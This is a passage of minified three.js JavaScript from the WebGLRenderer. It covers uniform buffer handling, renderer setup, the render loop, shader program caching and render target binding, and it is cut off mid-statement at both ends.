v=i.createBuffer(),w=g.__size,S=g.usage;return i.bindBuffer(i.UNIFORM_BUFFER,v),i.bufferData(i.UNIFORM_BUFFER,w,S),i.bindBuffer(i.UNIFORM_BUFFER,null),i.bindBufferBase(i.UNIFORM_BUFFER,_,v),v}function h(){for(let g=0;g<a;g++)if(o.indexOf(g)===-1)return o.push(g),g;return console.error("THREE.WebGLRenderer: Maximum number of simultaneously usable uniforms groups reached."),0}function p(g){const _=r[g.id],v=g.uniforms,w=g.__cache;i.bindBuffer(i.UNIFORM_BUFFER,_);for(let S=0,T=v.length;S<T;S++){const D=Array.isArray(v[S])?v[S]:[v[S]];for(let y=0,R=D.length;y<R;y++){const k=D[y];if(m(k,S,y,w)===!0){const X=k.__offset,et=Array.isArray(k.value)?k.value:[k.value];let P=0;for(let B=0;B<et.length;B++){const W=et[B],Y=x(W);typeof W=="number"||typeof W=="boolean"?(k.__data[0]=W,i.bufferSubData(i.UNIFORM_BUFFER,X+P,k.__data)):W.isMatrix3?(k.__data[0]=W.elements[0],k.__data[1]=W.elements[1],k.__data[2]=W.elements[2],k.__data[3]=0,k.__data[4]=W.elements[3],k.__data[5]=W.elements[4],k.__data[6]=W.elements[5],k.__data[7]=0,k.__data[8]=W.elements[6],k.__data[9]=W.elements[7],k.__data[10]=W.elements[8],k.__data[11]=0):(W.toArray(k.__data,P),P+=Y.storage/Float32Array.BYTES_PER_ELEMENT)}i.bufferSubData(i.UNIFORM_BUFFER,X,k.__data)}}}i.bindBuffer(i.UNIFORM_BUFFER,null)}function m(g,_,v,w){const S=g.value,T=_+"_"+v;if(w[T]===void 0)return typeof S=="number"||typeof S=="boolean"?w[T]=S:w[T]=S.clone(),!0;{const D=w[T];if(typeof S=="number"||typeof S=="boolean"){if(D!==S)return w[T]=S,!0}else if(D.equals(S)===!1)return D.copy(S),!0}return!1}function E(g){const _=g.uniforms;let v=0;const w=16;for(let T=0,D=_.length;T<D;T++){const y=Array.isArray(_[T])?_[T]:[_[T]];for(let R=0,k=y.length;R<k;R++){const X=y[R],et=Array.isArray(X.value)?X.value:[X.value];for(let P=0,B=et.length;P<B;P++){const W=et[P],Y=x(W),H=v%w;H!==0&&w-H<Y.boundary&&(v+=w-H),X.__data=new Float32Array(Y.storage/Float32Array.BYTES_PER_ELEMENT),X.__offset=v,v+=Y.storage}}}const S=v%w;return S>0&&(v+=w-S),g.__size=v,g.__cache={},this}function x(g){const _={boundary:0,storage:0};return typeof g=="number"||typeof g=="boolean"?(_.boundary=4,_.storage=4):g.isVector2?(_.boundary=8,_.storage=8):g.isVector3||g.isColor?(_.boundary=16,_.storage=12):g.isVector4?(_.boundary=16,_.storage=16):g.isMatrix3?(_.boundary=48,_.storage=48):g.isMatrix4?(_.boundary=64,_.storage=64):g.isTexture?console.warn("THREE.WebGLRenderer: Texture samplers can not be part of an uniforms group."):console.warn("THREE.WebGLRenderer: Unsupported uniform value type.",g),_}function f(g){const _=g.target;_.removeEventListener("dispose",f);const v=o.indexOf(_.__bindingPointIndex);o.splice(v,1),i.deleteBuffer(r[_.id]),delete r[_.id],delete s[_.id]}function d(){for(const g in r)i.deleteBuffer(r[g]);o=[],r={},s={}}return{bind:l,update:c,dispose:d}}class Io{constructor(t={}){const{canvas:e=Hl(),context:n=null,depth:r=!0,stencil:s=!0,alpha:o=!1,antialias:a=!1,premultipliedAlpha:l=!0,preserveDrawingBuffer:c=!1,powerPreference:u="default",failIfMajorPerformanceCaveat:h=!1}=t;this.isWebGLRenderer=!0;let p;n!==null?p=n.getContextAttributes().alpha:p=o;const m=new Uint32Array(4),E=new Int32Array(4);let x=null,f=null;const d=[],g=[];this.domElement=e,this.debug={checkShaderErrors:!0,onShaderError:null},this.autoClear=!0,this.autoClearColor=!0,this.autoClearDepth=!0,this.autoClearStencil=!0,this.sortObjects=!0,this.clippingPlanes=[],this.localClippingEnabled=!1,this._outputColorSpace=le,this._useLegacyLights=!1,this.toneMapping=on,this.toneMappingExposure=1;const _=this;let v=!1,w=0,S=0,T=null,D=-1,y=null;const R=new ce,k=new ce;let X=null;const et=new Ht(0);let P=0,B=e.width,W=e.height,Y=1,H=null,V=null;const q=new ce(0,0,B,W),J=new ce(0,0,B,W);let K=!1;const G=new So;let j=!1,rt=!1,pt=null;const ut=new Zt,St=new zt,Tt=new L,gt={background:null,fog:null,environment:null,overrideMaterial:null,isScene:!0};function Ut(){return T===null?Y:1}let N=n;function ne(b,I){for(let F=0;F<b.length;F++){const z=b[F],U=e.getContext(z,I);if(U!==null)return U}return null}try{const b={alpha:!0,depth:r,stencil:s,antialias:a,premultipliedAlpha:l,preserveDrawingBuffer:c,powerPreference:u,failIfMajorPerformanceCaveat:h};if("setAttribute"in e&&e.setAttribute("data-engine",`three.js r${ss}`),e.addEventListener("webglcontextlost",nt,!1),e.addEventListener("webglcontextrestored",C,!1),e.addEventListener("webglcontextcreationerror",st,!1),N===null){const I=["webgl2","webgl","experimental-webgl"];if(_.isWebGL1Renderer===!0&&I.shift(),N=ne(I,b),N===null)throw ne(I)?new Error("Error creating WebGL context with your selected attributes."):new Error("Error creating WebGL context.")}typeof WebGLRenderingContext<"u"&&N instanceof WebGLRenderingContext&&console.warn("THREE.WebGLRenderer: WebGL 1 support was deprecated in r153 and will be removed in r163."),N.getShaderPrecisionFormat===void 0&&(N.getShaderPrecisionFormat=function(){return{rangeMin:1,rangeMax:1,precision:1}})}catch(b){throw console.error("THREE.WebGLRenderer: "+b.message),b}let vt,Rt,ft,$t,Lt,A,M,O,Q,Z,tt,ht,ot,ct,yt,Dt,$,Vt,Bt,At,_t,dt,Pt,Gt;function Jt(){vt=new ip(N),Rt=new Ku(N,vt,t),vt.init(Rt),dt=new Vf(N,vt,Rt),ft=new Gf(N,vt,Rt),$t=new ap(N),Lt=new Rf,A=new Hf(N,vt,ft,Lt,Rt,dt,$t),M=new Ju(_),O=new np(_),Q=new fc(N,Rt),Pt=new ju(N,vt,Q,Rt),Z=new rp(N,Q,$t,Pt),tt=new dp(N,Z,Q,$t),Bt=new cp(N,Rt,A),Dt=new Zu(Lt),ht=new Af(_,M,O,vt,Rt,Pt,Dt),ot=new Yf(_,Lt),ct=new Cf,yt=new Uf(vt,Rt),Vt=new Yu(_,M,O,ft,tt,p,l),$=new zf(_,tt,Rt),Gt=new jf(N,$t,Rt,ft),At=new $u(N,vt,$t,Rt),_t=new sp(N,vt,$t,Rt),$t.programs=ht.programs,_.capabilities=Rt,_.extensions=vt,_.properties=Lt,_.renderLists=ct,_.shadowMap=$,_.state=ft,_.info=$t}Jt();const Ot=new qf(_,N);this.xr=Ot,this.getContext=function(){return N},this.getContextAttributes=function(){return N.getContextAttributes()},this.forceContextLoss=function(){const b=vt.get("WEBGL_lose_context");b&&b.loseContext()},this.forceContextRestore=function(){const b=vt.get("WEBGL_lose_context");b&&b.restoreContext()},this.getPixelRatio=function(){return Y},this.setPixelRatio=function(b){b!==void 0&&(Y=b,this.setSize(B,W,!1))},this.getSize=function(b){return b.set(B,W)},this.setSize=function(b,I,F=!0){if(Ot.isPresenting){console.warn("THREE.WebGLRenderer: Can't change size while VR device is presenting.");return}B=b,W=I,e.width=Math.floor(b*Y),e.height=Math.floor(I*Y),F===!0&&(e.style.width=b+"px",e.style.height=I+"px"),this.setViewport(0,0,b,I)},this.getDrawingBufferSize=function(b){return b.set(B*Y,W*Y).floor()},this.setDrawingBufferSize=function(b,I,F){B=b,W=I,Y=F,e.width=Math.floor(b*F),e.height=Math.floor(I*F),this.setViewport(0,0,b,I)},this.getCurrentViewport=function(b){return b.copy(R)},this.getViewport=function(b){return b.copy(q)},this.setViewport=function(b,I,F,z){b.isVector4?q.set(b.x,b.y,b.z,b.w):q.set(b,I,F,z),ft.viewport(R.copy(q).multiplyScalar(Y).floor())},this.getScissor=function(b){return b.copy(J)},this.setScissor=function(b,I,F,z){b.isVector4?J.set(b.x,b.y,b.z,b.w):J.set(b,I,F,z),ft.scissor(k.copy(J).multiplyScalar(Y).floor())},this.getScissorTest=function(){return K},this.setScissorTest=function(b){ft.setScissorTest(K=b)},this.setOpaqueSort=function(b){H=b},this.setTransparentSort=function(b){V=b},this.getClearColor=function(b){return b.copy(Vt.getClearColor())},this.setClearColor=function(){Vt.setClearColor.apply(Vt,arguments)},this.getClearAlpha=function(){return Vt.getClearAlpha()},this.setClearAlpha=function(){Vt.setClearAlpha.apply(Vt,arguments)},this.clear=function(b=!0,I=!0,F=!0){let z=0;if(b){let U=!1;if(T!==null){const lt=T.texture.format;U=lt===lo||lt===oo||lt===ao}if(U){const lt=T.texture.type,mt=lt===ln||lt===rn||lt===as||lt===yn||lt===ro||lt===so,Et=Vt.getClearColor(),bt=Vt.getClearAlpha(),Nt=Et.r,wt=Et.g,Ct=Et.b;mt?(m[0]=Nt,m[1]=wt,m[2]=Ct,m[3]=bt,N.clearBufferuiv(N.COLOR,0,m)):(E[0]=Nt,E[1]=wt,E[2]=Ct,E[3]=bt,N.clearBufferiv(N.COLOR,0,E))}else z|=N.COLOR_BUFFER_BIT}I&&(z|=N.DEPTH_BUFFER_BIT),F&&(z|=N.STENCIL_BUFFER_BIT,this.state.buffers.stencil.setMask(4294967295)),N.clear(z)},this.clearColor=function(){this.clear(!0,!1,!1)},this.clearDepth=function(){this.clear(!1,!0,!1)},this.clearStencil=function(){this.clear(!1,!1,!0)},this.dispose=function(){e.removeEventListener("webglcontextlost",nt,!1),e.removeEventListener("webglcontextrestored",C,!1),e.removeEventListener("webglcontextcreationerror",st,!1),ct.dispose(),yt.dispose(),Lt.dispose(),M.dispose(),O.dispose(),tt.dispose(),Pt.dispose(),Gt.dispose(),ht.dispose(),Ot.dispose(),Ot.removeEventListener("sessionstart",he),Ot.removeEventListener("sessionend",Yt),pt&&(pt.dispose(),pt=null),me.stop()};function nt(b){b.preventDefault(),console.log("THREE.WebGLRenderer: Context Lost."),v=!0}function C(){console.log("THREE.WebGLRenderer: Context Restored."),v=!1;const b=$t.autoReset,I=$.enabled,F=$.autoUpdate,z=$.needsUpdate,U=$.type;Jt(),$t.autoReset=b,$.enabled=I,$.autoUpdate=F,$.needsUpdate=z,$.type=U}function st(b){console.error("THREE.WebGLRenderer: A WebGL context could not be created. Reason: ",b.statusMessage)}function at(b){const I=b.target;I.removeEventListener("dispose",at),Mt(I)}function Mt(b){xt(b),Lt.remove(b)}function xt(b){const I=Lt.get(b).programs;I!==void 0&&(I.forEach(function(F){ht.releaseProgram(F)}),b.isShaderMaterial&&ht.releaseShaderCache(b))}this.renderBufferDirect=function(b,I,F,z,U,lt){I===null&&(I=gt);const mt=U.isMesh&&U.matrixWorld.determinant()<0,Et=Fo(b,I,F,z,U);ft.setMaterial(z,mt);let bt=F.index,Nt=1;if(z.wireframe===!0){if(bt=Z.getWireframeAttribute(F),bt===void 0)return;Nt=2}const wt=F.drawRange,Ct=F.attributes.position;let te=wt.start*Nt,Me=(wt.start+wt.count)*Nt;lt!==null&&(te=Math.max(te,lt.start*Nt),Me=Math.min(Me,(lt.start+lt.count)*Nt)),bt!==null?(te=Math.max(te,0),Me=Math.min(Me,bt.count)):Ct!=null&&(te=Math.max(te,0),Me=Math.min(Me,Ct.count));const ae=Me-te;if(ae<0||ae===1/0)return;Pt.setup(U,z,Et,F,bt);let Ve,Kt=At;if(bt!==null&&(Ve=Q.get(bt),Kt=_t,Kt.setIndex(Ve)),U.isMesh)z.wireframe===!0?(ft.setLineWidth(z.wireframeLinewidth*Ut()),Kt.setMode(N.LINES)):Kt.setMode(N.TRIANGLES);else if(U.isLine){let Ft=z.linewidth;Ft===void 0&&(Ft=1),ft.setLineWidth(Ft*Ut()),U.isLineSegments?Kt.setMode(N.LINES):U.isLineLoop?Kt.setMode(N.LINE_LOOP):Kt.setMode(N.LINE_STRIP)}else U.isPoints?Kt.setMode(N.POINTS):U.isSprite&&Kt.setMode(N.TRIANGLES);if(U.isBatchedMesh)Kt.renderMultiDraw(U._multiDrawStarts,U._multiDrawCounts,U._multiDrawCount);else if(U.isInstancedMesh)Kt.renderInstances(te,ae,U.count);else if(F.isInstancedBufferGeometry){const Ft=F._maxInstanceCount!==void 0?F._maxInstanceCount:1/0,ar=Math.min(F.instanceCount,Ft);Kt.renderInstances(te,ae,ar)}else Kt.render(te,ae)};function Xt(b,I,F){b.transparent===!0&&b.side===Oe&&b.forceSinglePass===!1?(b.side=Ee,b.needsUpdate=!0,Ei(b,I,F),b.side=cn,b.needsUpdate=!0,Ei(b,I,F),b.side=Oe):Ei(b,I,F)}this.compile=function(b,I,F=null){F===null&&(F=b),f=yt.get(F),f.init(),g.push(f),F.traverseVisible(function(U){U.isLight&&U.layers.test(I.layers)&&(f.pushLight(U),U.castShadow&&f.pushShadow(U))}),b!==F&&b.traverseVisible(function(U){U.isLight&&U.layers.test(I.layers)&&(f.pushLight(U),U.castShadow&&f.pushShadow(U))}),f.setupLights(_._useLegacyLights);const z=new Set;return b.traverse(function(U){const lt=U.material;if(lt)if(Array.isArray(lt))for(let mt=0;mt<lt.length;mt++){const Et=lt[mt];Xt(Et,F,U),z.add(Et)}else Xt(lt,F,U),z.add(lt)}),g.pop(),f=null,z},this.compileAsync=function(b,I,F=null){const z=this.compile(b,I,F);return new Promise(U=>{function lt(){if(z.forEach(function(mt){Lt.get(mt).currentProgram.isReady()&&z.delete(mt)}),z.size===0){U(b);return}setTimeout(lt,10)}vt.get("KHR_parallel_shader_compile")!==null?lt():setTimeout(lt,10)})};let qt=null;function se(b){qt&&qt(b)}function he(){me.stop()}function Yt(){me.start()}const me=new bo;me.setAnimationLoop(se),typeof self<"u"&&me.setContext(self),this.setAnimationLoop=function(b){qt=b,Ot.setAnimationLoop(b),b===null?me.stop():me.start()},Ot.addEventListener("sessionstart",he),Ot.addEventListener("sessionend",Yt),this.render=function(b,I){if(I!==void 0&&I.isCamera!==!0){console.error("THREE.WebGLRenderer.render: camera is not an instance of THREE.Camera.");return}if(v===!0)return;b.matrixWorldAutoUpdate===!0&&b.updateMatrixWorld(),I.parent===null&&I.matrixWorldAutoUpdate===!0&&I.updateMatrixWorld(),Ot.enabled===!0&&Ot.isPresenting===!0&&(Ot.cameraAutoUpdate===!0&&Ot.updateCamera(I),I=Ot.getCamera()),b.isScene===!0&&b.onBeforeRender(_,b,I,T),f=yt.get(b,g.length),f.init(),g.push(f),ut.multiplyMatrices(I.projectionMatrix,I.matrixWorldInverse),G.setFromProjectionMatrix(ut),rt=this.localClippingEnabled,j=Dt.init(this.clippingPlanes,rt),x=ct.get(b,d.length),x.init(),d.push(x),ze(b,I,0,_.sortObjects),x.finish(),_.sortObjects===!0&&x.sort(H,V),this.info.render.frame++,j===!0&&Dt.beginShadows();const F=f.state.shadowsArray;if($.render(F,b,I),j===!0&&Dt.endShadows(),this.info.autoReset===!0&&this.info.reset(),Vt.render(x,b),f.setupLights(_._useLegacyLights),I.isArrayCamera){const z=I.cameras;for(let U=0,lt=z.length;U<lt;U++){const mt=z[U];hs(x,b,mt,mt.viewport)}}else hs(x,b,I);T!==null&&(A.updateMultisampleRenderTarget(T),A.updateRenderTargetMipmap(T)),b.isScene===!0&&b.onAfterRender(_,b,I),Pt.resetDefaultState(),D=-1,y=null,g.pop(),g.length>0?f=g[g.length-1]:f=null,d.pop(),d.length>0?x=d[d.length-1]:x=null};function ze(b,I,F,z){if(b.visible===!1)return;if(b.layers.test(I.layers)){if(b.isGroup)F=b.renderOrder;else if(b.isLOD)b.autoUpdate===!0&&b.update(I);else if(b.isLight)f.pushLight(b),b.castShadow&&f.pushShadow(b);else if(b.isSprite){if(!b.frustumCulled||G.intersectsSprite(b)){z&&Tt.setFromMatrixPosition(b.matrixWorld).applyMatrix4(ut);const mt=tt.update(b),Et=b.material;Et.visible&&x.push(b,mt,Et,F,Tt.z,null)}}else if((b.isMesh||b.isLine||b.isPoints)&&(!b.frustumCulled||G.intersectsObject(b))){const mt=tt.update(b),Et=b.material;if(z&&(b.boundingSphere!==void 0?(b.boundingSphere===null&&b.computeBoundingSphere(),Tt.copy(b.boundingSphere.center)):(mt.boundingSphere===null&&mt.computeBoundingSphere(),Tt.copy(mt.boundingSphere.center)),Tt.applyMatrix4(b.matrixWorld).applyMatrix4(ut)),Array.isArray(Et)){const bt=mt.groups;for(let Nt=0,wt=bt.length;Nt<wt;Nt++){const Ct=bt[Nt],te=Et[Ct.materialIndex];te&&te.visible&&x.push(b,mt,te,F,Tt.z,Ct)}}else Et.visible&&x.push(b,mt,Et,F,Tt.z,null)}}const lt=b.children;for(let mt=0,Et=lt.length;mt<Et;mt++)ze(lt[mt],I,F,z)}function hs(b,I,F,z){const U=b.opaque,lt=b.transmissive,mt=b.transparent;f.setupLightsView(F),j===!0&&Dt.setGlobalState(_.clippingPlanes,F),lt.length>0&&Oo(U,lt,I,F),z&&ft.viewport(R.copy(z)),U.length>0&&xi(U,I,F),lt.length>0&&xi(lt,I,F),mt.length>0&&xi(mt,I,F),ft.buffers.depth.setTest(!0),ft.buffers.depth.setMask(!0),ft.buffers.color.setMask(!0),ft.setPolygonOffset(!1)}function Oo(b,I,F,z){if((F.isScene===!0?F.overrideMaterial:null)!==null)return;const lt=Rt.isWebGL2;pt===null&&(pt=new Tn(1,1,{generateMipmaps:!0,type:vt.has("EXT_color_buffer_half_float")?hi:ln,minFilter:fi,samples:lt?4:0})),_.getDrawingBufferSize(St),lt?pt.setSize(St.x,St.y):pt.setSize(es(St.x),es(St.y));const mt=_.getRenderTarget();_.setRenderTarget(pt),_.getClearColor(et),P=_.getClearAlpha(),P<1&&_.setClearColor(16777215,.5),_.clear();const Et=_.toneMapping;_.toneMapping=on,xi(b,F,z),A.updateMultisampleRenderTarget(pt),A.updateRenderTargetMipmap(pt);let bt=!1;for(let Nt=0,wt=I.length;Nt<wt;Nt++){const Ct=I[Nt],te=Ct.object,Me=Ct.geometry,ae=Ct.material,Ve=Ct.group;if(ae.side===Oe&&te.layers.test(z.layers)){const Kt=ae.side;ae.side=Ee,ae.needsUpdate=!0,ms(te,F,z,Me,ae,Ve),ae.side=Kt,ae.needsUpdate=!0,bt=!0}}bt===!0&&(A.updateMultisampleRenderTarget(pt),A.updateRenderTargetMipmap(pt)),_.setRenderTarget(mt),_.setClearColor(et,P),_.toneMapping=Et}function xi(b,I,F){const z=I.isScene===!0?I.overrideMaterial:null;for(let U=0,lt=b.length;U<lt;U++){const mt=b[U],Et=mt.object,bt=mt.geometry,Nt=z===null?mt.material:z,wt=mt.group;Et.layers.test(F.layers)&&ms(Et,I,F,bt,Nt,wt)}}function ms(b,I,F,z,U,lt){b.onBeforeRender(_,I,F,z,U,lt),b.modelViewMatrix.multiplyMatrices(F.matrixWorldInverse,b.matrixWorld),b.normalMatrix.getNormalMatrix(b.modelViewMatrix),U.onBeforeRender(_,I,F,z,b,lt),U.transparent===!0&&U.side===Oe&&U.forceSinglePass===!1?(U.side=Ee,U.needsUpdate=!0,_.renderBufferDirect(F,I,z,U,b,lt),U.side=cn,U.needsUpdate=!0,_.renderBufferDirect(F,I,z,U,b,lt),U.side=Oe):_.renderBufferDirect(F,I,z,U,b,lt),b.onAfterRender(_,I,F,z,U,lt)}function Ei(b,I,F){I.isScene!==!0&&(I=gt);const z=Lt.get(b),U=f.state.lights,lt=f.state.shadowsArray,mt=U.state.version,Et=ht.getParameters(b,U.state,lt,I,F),bt=ht.getProgramCacheKey(Et);let Nt=z.programs;z.environment=b.isMeshStandardMaterial?I.environment:null,z.fog=I.fog,z.envMap=(b.isMeshStandardMaterial?O:M).get(b.envMap||z.environment),Nt===void 0&&(b.addEventListener("dispose",at),Nt=new Map,z.programs=Nt);let wt=Nt.get(bt);if(wt!==void 0){if(z.currentProgram===wt&&z.lightsStateVersion===mt)return gs(b,Et),wt}else Et.uniforms=ht.getUniforms(b),b.onBuild(F,Et,_),b.onBeforeCompile(Et,_),wt=ht.acquireProgram(Et,bt),Nt.set(bt,wt),z.uniforms=Et.uniforms;const Ct=z.uniforms;return(!b.isShaderMaterial&&!b.isRawShaderMaterial||b.clipping===!0)&&(Ct.clippingPlanes=Dt.uniform),gs(b,Et),z.needsLights=Bo(b),z.lightsStateVersion=mt,z.needsLights&&(Ct.ambientLightColor.value=U.state.ambient,Ct.lightProbe.value=U.state.probe,Ct.directionalLights.value=U.state.directional,Ct.directionalLightShadows.value=U.state.directionalShadow,Ct.spotLights.value=U.state.spot,Ct.spotLightShadows.value=U.state.spotShadow,Ct.rectAreaLights.value=U.state.rectArea,Ct.ltc_1.value=U.state.rectAreaLTC1,Ct.ltc_2.value=U.state.rectAreaLTC2,Ct.pointLights.value=U.state.point,Ct.pointLightShadows.value=U.state.pointShadow,Ct.hemisphereLights.value=U.state.hemi,Ct.directionalShadowMap.value=U.state.directionalShadowMap,Ct.directionalShadowMatrix.value=U.state.directionalShadowMatrix,Ct.spotShadowMap.value=U.state.spotShadowMap,Ct.spotLightMatrix.value=U.state.spotLightMatrix,Ct.spotLightMap.value=U.state.spotLightMap,Ct.pointShadowMap.value=U.state.pointShadowMap,Ct.pointShadowMatrix.value=U.state.pointShadowMatrix),z.currentProgram=wt,z.uniformsList=null,wt}function _s(b){if(b.uniformsList===null){const I=b.currentProgram.getUniforms();b.uniformsList=qi.seqWithValue(I.seq,b.uniforms)}return b.uniformsList}function gs(b,I){const F=Lt.get(b);F.outputColorSpace=I.outputColorSpace,F.batching=I.batching,F.instancing=I.instancing,F.instancingColor=I.instancingColor,F.skinning=I.skinning,F.morphTargets=I.morphTargets,F.morphNormals=I.morphNormals,F.morphColors=I.morphColors,F.morphTargetsCount=I.morphTargetsCount,F.numClippingPlanes=I.numClippingPlanes,F.numIntersection=I.numClipIntersection,F.vertexAlphas=I.vertexAlphas,F.vertexTangents=I.vertexTangents,F.toneMapping=I.toneMapping}function Fo(b,I,F,z,U){I.isScene!==!0&&(I=gt),A.resetTextureUnits();const lt=I.fog,mt=z.isMeshStandardMaterial?I.environment:null,Et=T===null?_.outputColorSpace:T.isXRRenderTarget===!0?T.texture.colorSpace:Ze,bt=(z.isMeshStandardMaterial?O:M).get(z.envMap||mt),Nt=z.vertexColors===!0&&!!F.attributes.color&&F.attributes.color.itemSize===4,wt=!!F.attributes.tangent&&(!!z.normalMap||z.anisotropy>0),Ct=!!F.morphAttributes.position,te=!!F.morphAttributes.normal,Me=!!F.morphAttributes.color;let ae=on;z.toneMapped&&(T===null||T.isXRRenderTarget===!0)&&(ae=_.toneMapping);const Ve=F.morphAttributes.position||F.morphAttributes.normal||F.morphAttributes.color,Kt=Ve!==void 0?Ve.length:0,Ft=Lt.get(z),ar=f.state.lights;if(j===!0&&(rt===!0||b!==y)){const Ae=b===y&&z.id===D;Dt.setState(z,b,Ae)}let Qt=!1;z.version===Ft.__version?(Ft.needsLights&&Ft.lightsStateVersion!==ar.state.version||Ft.outputColorSpace!==Et||U.isBatchedMesh&&Ft.batching===!1||!U.isBatchedMesh&&Ft.batching===!0||U.isInstancedMesh&&Ft.instancing===!1||!U.isInstancedMesh&&Ft.instancing===!0||U.isSkinnedMesh&&Ft.skinning===!1||!U.isSkinnedMesh&&Ft.skinning===!0||U.isInstancedMesh&&Ft.instancingColor===!0&&U.instanceColor===null||U.isInstancedMesh&&Ft.instancingColor===!1&&U.instanceColor!==null||Ft.envMap!==bt||z.fog===!0&&Ft.fog!==lt||Ft.numClippingPlanes!==void 0&&(Ft.numClippingPlanes!==Dt.numPlanes||Ft.numIntersection!==Dt.numIntersection)||Ft.vertexAlphas!==Nt||Ft.vertexTangents!==wt||Ft.morphTargets!==Ct||Ft.morphNormals!==te||Ft.morphColors!==Me||Ft.toneMapping!==ae||Rt.isWebGL2===!0&&Ft.morphTargetsCount!==Kt)&&(Qt=!0):(Qt=!0,Ft.__version=z.version);let dn=Ft.currentProgram;Qt===!0&&(dn=Ei(z,I,U));let vs=!1,ni=!1,or=!1;const ue=dn.getUniforms(),un=Ft.uniforms;if(ft.useProgram(dn.program)&&(vs=!0,ni=!0,or=!0),z.id!==D&&(D=z.id,ni=!0),vs||y!==b){ue.setValue(N,"projectionMatrix",b.projectionMatrix),ue.setValue(N,"viewMatrix",b.matrixWorldInverse);const Ae=ue.map.cameraPosition;Ae!==void 0&&Ae.setValue(N,Tt.setFromMatrixPosition(b.matrixWorld)),Rt.logarithmicDepthBuffer&&ue.setValue(N,"logDepthBufFC",2/(Math.log(b.far+1)/Math.LN2)),(z.isMeshPhongMaterial||z.isMeshToonMaterial||z.isMeshLambertMaterial||z.isMeshBasicMaterial||z.isMeshStandardMaterial||z.isShaderMaterial)&&ue.setValue(N,"isOrthographic",b.isOrthographicCamera===!0),y!==b&&(y=b,ni=!0,or=!0)}if(U.isSkinnedMesh){ue.setOptional(N,U,"bindMatrix"),ue.setOptional(N,U,"bindMatrixInverse");const Ae=U.skeleton;Ae&&(Rt.floatVertexTextures?(Ae.boneTexture===null&&Ae.computeBoneTexture(),ue.setValue(N,"boneTexture",Ae.boneTexture,A)):console.warn("THREE.WebGLRenderer: SkinnedMesh can only be used with WebGL 2. With WebGL 1 OES_texture_float and vertex textures support is required."))}U.isBatchedMesh&&(ue.setOptional(N,U,"batchingTexture"),ue.setValue(N,"batchingTexture",U._matricesTexture,A));const lr=F.morphAttributes;if((lr.position!==void 0||lr.normal!==void 0||lr.color!==void 0&&Rt.isWebGL2===!0)&&Bt.update(U,F,dn),(ni||Ft.receiveShadow!==U.receiveShadow)&&(Ft.receiveShadow=U.receiveShadow,ue.setValue(N,"receiveShadow",U.receiveShadow)),z.isMeshGouraudMaterial&&z.envMap!==null&&(un.envMap.value=bt,un.flipEnvMap.value=bt.isCubeTexture&&bt.isRenderTargetTexture===!1?-1:1),ni&&(ue.setValue(N,"toneMappingExposure",_.toneMappingExposure),Ft.needsLights&&ko(un,or),lt&&z.fog===!0&&ot.refreshFogUniforms(un,lt),ot.refreshMaterialUniforms(un,z,Y,W,pt),qi.upload(N,_s(Ft),un,A)),z.isShaderMaterial&&z.uniformsNeedUpdate===!0&&(qi.upload(N,_s(Ft),un,A),z.uniformsNeedUpdate=!1),z.isSpriteMaterial&&ue.setValue(N,"center",U.center),ue.setValue(N,"modelViewMatrix",U.modelViewMatrix),ue.setValue(N,"normalMatrix",U.normalMatrix),ue.setValue(N,"modelMatrix",U.matrixWorld),z.isShaderMaterial||z.isRawShaderMaterial){const Ae=z.uniformsGroups;for(let cr=0,zo=Ae.length;cr<zo;cr++)if(Rt.isWebGL2){const xs=Ae[cr];Gt.update(xs,dn),Gt.bind(xs,dn)}else console.warn("THREE.WebGLRenderer: Uniform Buffer Objects can only be used with WebGL 2.")}return dn}function ko(b,I){b.ambientLightColor.needsUpdate=I,b.lightProbe.needsUpdate=I,b.directionalLights.needsUpdate=I,b.directionalLightShadows.needsUpdate=I,b.pointLights.needsUpdate=I,b.pointLightShadows.needsUpdate=I,b.spotLights.needsUpdate=I,b.spotLightShadows.needsUpdate=I,b.rectAreaLights.needsUpdate=I,b.hemisphereLights.needsUpdate=I}function Bo(b){return b.isMeshLambertMaterial||b.isMeshToonMaterial||b.isMeshPhongMaterial||b.isMeshStandardMaterial||b.isShadowMaterial||b.isShaderMaterial&&b.lights===!0}this.getActiveCubeFace=function(){return w},this.getActiveMipmapLevel=function(){return S},this.getRenderTarget=function(){return T},this.setRenderTargetTextures=function(b,I,F){Lt.get(b.texture).__webglTexture=I,Lt.get(b.depthTexture).__webglTexture=F;const z=Lt.get(b);z.__hasExternalTextures=!0,z.__hasExternalTextures&&(z.__autoAllocateDepthBuffer=F===void 0,z.__autoAllocateDepthBuffer||vt.has("WEBGL_multisampled_render_to_texture")===!0&&(console.warn("THREE.WebGLRenderer: Render-to-texture extension was disabled because an external texture was provided"),z.__useRenderToTexture=!1))},this.setRenderTargetFramebuffer=function(b,I){const F=Lt.get(b);F.__webglFramebuffer=I,F.__useDefaultFramebuffer=I===void 0},this.setRenderTarget=function(b,I=0,F=0){T=b,w=I,S=F;let z=!0,U=null,lt=!1,mt=!1;if(b){const bt=Lt.get(b);bt.__useDefaultFramebuffer!==void 0?(ft.bindFramebuffer(N.FRAMEBUFFER,null),z=!1):bt.__webglFramebuffer===void 0?A.setupRenderTarget(b):bt.__hasExternalTextures&&A.rebindTextures(b,Lt.get(b.texture).__webglTexture,Lt.get(b.depthTexture).__webglTexture);const Nt=b.texture;(Nt.isData3DTexture||Nt.isDataArrayTexture||Nt.isCompressedArrayTexture)&&(mt=!0);const wt=Lt.get(b).__webglFramebuffer;b.isWebGLCubeRenderTarget?(Array.isArray(wt[I])?U=wt[I][F]:U=wt[I],lt=!0):Rt.isWebGL2&&b.samples>0&&A.useMultisampledRTT(b)===!1?U=Lt.get(b).__webglMultisampledFramebuffer:Array.isArray(wt)?U=wt[F]:U=wt,R.copy(b.viewport),k.copy(b.scissor),X=b.scissorTest}else R.copy(q).multiplyScalar(Y).floor(),k.copy(J).multiplyScalar(Y).floor(),X=K;if(ft.bindFramebuffer(N.FRAMEBUFFER,U)&&Rt.drawBuffers&&z&&ft.drawBuffers(b,U),ft.viewport(R),ft.scissor(k),ft.setScissorTest(X),lt){const bt=Lt.get(b.texture);N.framebufferTexture2D(N.FRAMEBUFFER,N.COLOR_ATTACHMENT0,N.TEXTURE_CUBE_MAP_POSITIVE_X+I,bt.__webglTexture,F)}else if(mt){const bt=Lt.get(b.texture),Nt=I||0;N.framebufferTextureLayer(N.FRAMEBUFFER,N.COLOR_ATTACHMENT0,bt.__webglTexture,F||0,Nt)}D=-1},this.readRenderTargetPixels=function(b,I,F,z,U,lt,mt){if(!(b&&b.isWebGLRenderTarget)){console.error("THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not THREE.WebGLRenderTarget.");return}let 